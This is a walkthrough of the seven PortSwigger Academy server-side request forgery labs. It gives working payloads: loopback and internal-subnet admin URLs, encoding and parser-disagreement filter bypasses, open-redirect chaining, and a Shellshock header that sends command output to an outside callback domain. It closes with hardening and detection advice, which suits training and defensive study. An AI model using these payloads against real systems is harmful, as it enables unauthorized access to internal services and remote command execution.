# PortSwigger SSRF 1-7 — URL Parsing, Network Position, and Callback Channels

This is a consolidated walkthrough of the seven PortSwigger Server-side request forgery labs. The useful lesson is not one URL trick. It is the boundary model:

**SSRF happens when an application turns attacker-influenced input into a server-side network request without applying the same trust boundary that would protect the target service directly.**

The target may be loopback, an internal subnet, a metadata endpoint, or an internal CGI service. The feedback channel may be an HTTP response, an OAST interaction, a redirect-following side effect, or a lab-specific answer submission.

## 1. Overview

| # | Lab | Difficulty | Entry point | Target | Core idea |
|---|-----|------------|-------------|--------|-----------|
| 1 | Basic SSRF against the local server | Apprentice | `stockApi` | `localhost` admin | replace the stock-check URL with the loopback admin URL |
| 2 | Basic SSRF against another back-end system | Apprentice | `stockApi` | `192.168.0.0/24:8080` | scan the internal range through the stock checker, then delete `carlos` |
| 3 | Blind SSRF with out-of-band detection | Practitioner | product `Referer` | Collaborator/OAST | analytics fetches the `Referer` URL asynchronously |
| 4 | SSRF with blacklist-based input filter | Practitioner | `stockApi` | `localhost` admin | use `127.1` and encoded `admin` to bypass string blacklists |
| 5 | Open-redirection filter bypass | Practitioner | `stockApi` + `/product/nextProduct` | `192.168.0.12:8080` | feed a same-site open redirect into a redirect-following stock checker |
| 6 | Blind SSRF with Shellshock validation | Expert | `Referer` + `User-Agent` | internal `192.168.0.0/24:8080` | analytics request carries a controlled header into an internal CGI environment |
| 7 | Whitelist-based filter bypass | Expert | `stockApi` | `localhost` admin | userinfo plus a double-encoded fragment creates URL parser disagreement |

All seven labs solved.

## 2. The decision tree

```text
Controllable server-side URL?  -> request loopback/internal admin directly
No visible response?           -> use OAST as the proof channel
Host/path blacklist?           -> try alternate IP forms and encoding layers
Only same-site URLs allowed?   -> look for an open redirect the HTTP client follows
Whitelist host validation?     -> look for parser disagreement: userinfo, fragments, double encoding
Headers reach internal CGI?    -> validate the header-to-environment boundary with the smallest action
```

## 3. Direct SSRF through `stockApi`

The stock checker posts a URL:

```http
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

For the loopback lab, the replacement is enough:

```text
http://localhost/admin
http://localhost/admin/delete?username=carlos
```

The second lab moves the admin service to an internal subnet. The method is the same, but the target host must be discovered:

```text
http://192.168.0.X:8080/admin
```

In this run, `192.168.0.188:8080` returned the admin page. Deleting through:

```text
http://192.168.0.188:8080/admin/delete?username=carlos
```

solved the lab.

The defensive takeaway is that the external access-control rule did not protect the internal service once another trusted backend could be induced to make the request.

## 4. Blind SSRF through `Referer`

The blind SSRF lab uses analytics software that fetches the URL in the `Referer` header when a product page is loaded:

```http
GET /product?productId=1
Referer: http://<collaborator-domain>/ref
```

The application response does not show the fetched resource, so the proof is the outbound DNS/HTTP interaction. PortSwigger Academy restricts arbitrary third-party OAST services in these labs; `*.burpcollaborator.net` is the reliable Academy-accepted target.

This lab only needs proof of interaction, not data retrieval. If a later lab requires reading the interaction body or DNS label and no equivalent channel is available, I record it as requiring user-assisted Collaborator/OAST review and continue with other labs.

## 5. Blacklist bypasses

The blacklist lab blocks obvious loopback and the literal `admin` path:

```text
http://127.0.0.1/
http://127.1/admin
```

Two small transformations are enough:

```text
http://127.1/
http://127.1/%61dmin/delete?username=carlos
```

When submitted as form data, `%61` is encoded on the wire as `%2561`, which is the double-encoding layer the official solution describes. The filter sees a non-literal path segment; the downstream URL handling resolves it back to `/admin`.

The lesson is that string blacklists are usually validating a representation, not the normalized destination.

## 6. Redirect-following bypass

The open-redirection lab prevents direct off-site targets in `stockApi`, but the application also has:

```text
/product/nextProduct?path=<url>
```

The stock checker accepts this same-site path and follows the redirect:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

This is a common SSRF composition bug: one component validates the first URL, another component follows the redirect, and no one revalidates the final destination.

## 7. Blind SSRF plus CGI header risk

The Shellshock lab has two moving parts:

- analytics fetches `Referer`, so it can reach internal `192.168.0.X:8080` hosts;
- the internal service places `User-Agent` into a CGI/Bash environment.

The official solution uses a minimal DNS callback shape:

```text
() { :; }; /usr/bin/nslookup $(whoami).<collaborator-domain>
```

and then submits the OS user observed in the DNS label.

In this run, I avoided a manual Collaborator dependency by using the lab's own answer endpoint as the return channel: the internal host submitted `answer=$(whoami)` back to the current lab's `/submitSolution`. That kept the validation confined to the authorized Academy instance and did not require exposing the session cookie in logs. After scanning `192.168.0.1-255:8080`, the lab solved within a few seconds.

This is not a general replacement for Collaborator. In a real assessment, if DNS/OAST is the only observable channel, the correct statement is "interaction required" until the callback is observed.

## 8. Whitelist parser disagreement

The whitelist lab requires the URL hostname to be:

```text
stock.weliketoshop.net
```

The parser accepts embedded credentials:

```text
http://username@stock.weliketoshop.net/
```

The working payload combines userinfo with a double-encoded fragment:

```text
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

At validation time, the URL still appears to reference the whitelisted host. After decoding, the request-side parser treats `#@stock.weliketoshop.net/...` as a fragment and connects to `localhost:80`.

The root issue is not "bad regex" alone. It is using one interpretation of a URL for validation and another interpretation for the actual network request.

## 9. Operational notes

- Check the normal request first; many SSRF labs expose the sink in a single parameter such as `stockApi`.
- For blind SSRF, prove the network primitive before trying to retrieve data.
- Do not assume `127.0.0.1` is the only loopback representation. Test normalized destination, not strings.
- Every redirect hop must be revalidated. A same-site first hop can still land on an internal final URL.
- Parser differences often involve userinfo, fragments, encoded fragments, port handling, and decode order.
- If an OAST callback must be read and no alternative channel exists, record the lab as needing user-assisted Collaborator review instead of stalling the whole series.

## 10. Defense and detection

### Hardening

- Do not let users provide raw backend request URLs; map business IDs to fixed backend targets.
- Use a strict allowlist and validate after DNS resolution.
- Block loopback, link-local, RFC1918, metadata IPs, and internal admin ranges at the egress layer.
- Disable automatic redirects, or reapply the same allowlist and resolved-IP checks on every hop.
- Use the same URL parser and normalized URL for validation and request execution.
- Strip or strictly control user-controlled headers before proxying to internal services.
- Do not rely on "internal only" as the sole admin authentication boundary.

### Detection ideas

- Backend requests to `127.0.0.1`, `127.1`, `localhost`, `169.254.169.254`, `192.168.0.0/16`, or OAST domains.
- Parameters such as `url`, `uri`, `path`, `next`, `redirect`, or `stockApi` containing private IPs, userinfo, encoded fragments, or unusual IP notation.
- One application endpoint causing many outbound requests across an internal subnet.
- Redirect chains whose first URL is public/same-site and final URL is loopback or RFC1918.
- Internal CGI logs receiving unusual `User-Agent` values that resemble Bash function definitions.

The simplest defensive rule is also the most durable: treat server-side URL fetching as a privileged network operation, not as a harmless helper function.
